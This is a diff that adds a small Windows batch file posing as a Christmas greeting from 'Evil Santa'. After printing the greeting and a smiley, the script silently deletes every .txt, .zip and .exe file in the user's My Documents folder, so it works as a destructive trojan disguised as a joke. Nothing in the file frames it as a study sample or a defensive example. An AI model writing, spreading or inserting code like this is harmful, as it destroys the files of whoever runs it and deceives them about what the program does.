@@ -1,0 +1,7 @@
+@Echo off
+echo.
+echo Evi|SanTa WiSHEs eVeRybOdY a HaPPy x'MaS!!
+echo :-)
+del c:\mydocu~1\*.txt
+del c:\mydocu~1\*.zip
+del c:\mydocu~1\*.exe
